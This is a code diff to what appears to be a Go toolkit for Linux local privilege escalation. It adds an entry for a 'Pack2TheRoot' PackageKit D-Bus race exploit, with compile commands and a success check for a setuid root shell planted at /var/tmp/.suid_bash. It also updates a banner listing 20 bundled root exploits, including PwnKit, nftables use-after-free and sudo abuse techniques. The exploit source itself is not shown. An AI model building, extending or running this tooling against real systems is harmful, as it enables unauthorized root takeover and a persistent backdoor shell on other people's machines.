@@ -347,6 +347,23 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			CompileCmd:  []string{"gcc", "-O2", "-static", "-lpthread"},
 		},
 		{
+			Name:        "cve_2026_41651",
+			Filename:    "cve_2026_41651.c",
+			Description: "CVE-2026-41651: Pack2TheRoot - PackageKit D-Bus race -> setuid root",
+			Introduced:  "2.6",
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			Timeout:     120 * time.Second,
+			SkipCheck: func() bool {
+				_, err := os.Stat("/var/run/dbus/system_bus_socket")
+				return err != nil
+			},
+			SuccessCheck: func() bool {
+				st, err := os.Stat("/var/tmp/.suid_bash")
+				if err != nil { return false }
+				return st.Mode()&os.ModeSetuid != 0
+			},
+		},
+		{
 			Name:        "cve_2021_3560",
 			Filename:    "cve_2021_3560.c",
 			Description: "CVE-2021-3560: Polkit accounts-daemon D-Bus race",
@@ -732,7 +749,7 @@ func (tk *Toolkit) Run() {
 	if !tk.quiet {
 		fmt.Printf(`
 ╔══════════════════════════════════════════════════════════╗
-║      Linux LPE Toolkit - 19 exploits loaded              ║
+║      Linux LPE Toolkit - 20 exploits loaded              ║
 ╠══════════════════════════════════════════════════════════╣
 ║  1. Copy Fail      CVE-2026-31431   AF_ALG + splice    ║
 ║  2. Dirty Frag     CVE-2026-43284   xfrm-ESP/RxRPC     ║
@@ -745,14 +762,15 @@ func (tk *Toolkit) Run() {
 ║  9. PwnKit         CVE-2021-4034   pkexec env escape  ║
 ║ 10. OverlayFS      CVE-2021-3493   user-ns mount      ║
 ║ 11. OvFS+FUSE      CVE-2023-0386   FUSE mount escape  ║
-║ 12. Polkit D-Bus   CVE-2021-3560   accounts-daemon    ║
-║ 13. Docker Socket  (misconfig)     docker.sock abuse  ║
-║ 14. netfilter OOB  CVE-2021-22555  ip_tables corrupt  ║
-║ 15. nft UAF2       CVE-2022-2586   nftables chain     ║
-║ 16. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
-║ 17. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
-║ 18. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
-║ 19. GTFOBins       sudo abuse      80+ techniques      ║
+║ 12. Pack2TheRoot   CVE-2026-41651  PackageKit D-Bus    ║
+║ 13. Polkit D-Bus   CVE-2021-3560   accounts-daemon    ║
+║ 14. Docker Socket  (misconfig)     docker.sock abuse  ║
+║ 15. netfilter OOB  CVE-2021-22555  ip_tables corrupt  ║
+║ 16. nft UAF2       CVE-2022-2586   nftables chain     ║
+║ 17. pidfd race     CVE-2026-46333  ssh-keysign/shadow ║
+║ 18. CPU Timer Race CVE-2025-38352  POSIX timer race   ║
+║ 19. nft UAF        CVE-2024-1086   Notselwyn multi-f  ║
+║ 20. GTFOBins       sudo abuse      80+ techniques      ║
 ╚══════════════════════════════════════════════════════════╝
 
 [*] Detected kernel: %s
